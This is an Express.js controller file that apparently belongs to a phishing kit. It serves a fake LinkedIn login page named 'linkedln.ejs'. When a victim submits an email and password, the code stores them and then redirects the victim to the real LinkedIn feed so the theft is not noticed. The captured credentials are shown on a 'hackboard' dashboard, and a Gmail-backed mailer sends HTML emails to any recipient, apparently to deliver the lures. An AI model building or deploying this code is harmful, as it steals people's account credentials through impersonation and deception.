const nodemailer = require("nodemailer");
const Mailgen = require("mailgen");
require("dotenv").config();

const homeController = (req, res, next) => {
  res.render("index.ejs");
};

let username = "";
let password = "";

const hackPort = (req, res, next) => {
  res.render("hack.ejs");
};

const dashBoard = (req, res, next) => {
  res.render("DashBoard.ejs", {
    username: username,
    password: password,
  });
};

const LoginForm = (req, res, next) => {
  res.render("linkedln.ejs");
};

const targetUrl="https://www.linkedin.com/feed/"
const postData = async (req, res, next) => {
  username = await req.body.email;
  password = await req.body.password;

  if (username && password) {
    res.redirect(targetUrl);
  }
};

const sendMail = (req, res, next) => {
  res.render("mail.ejs");
};

const model = (req, res, next) => {
  res.render("analysis.ejs");
};

const mailData = async (req, res, next) => {
  let config = {
    service: "gmail",
    auth: {
      user: process.env.EMAIL,
      pass: process.env.PASSWORD,
    },
  };

  let transporter = nodemailer.createTransport(config);

  let MailGenerator = new Mailgen({
    theme: "default",
    product: {
      name: "Mailgen",
      link: "https://mailgen.js/",
    },
  });

  let response = {
    body: {
      table: {
        data: [
          {
            message: req.body.mailbody,
          },
        ],
      },
      outro: "Looking forward to do more business",
    },
  };
  let mail = MailGenerator.generate(response);

  let message = {
    from: process.env.EMAIL,
    to: req.body.to,
    subject: req.body.subject,
    html: mail,
  };
  transporter.sendMail(message);

  res.redirect("/hackboard");
};

module.exports = {
  homeController,
  hackPort,
  dashBoard,
  LoginForm,
  postData,
  model,
  sendMail,
  mailData,
};



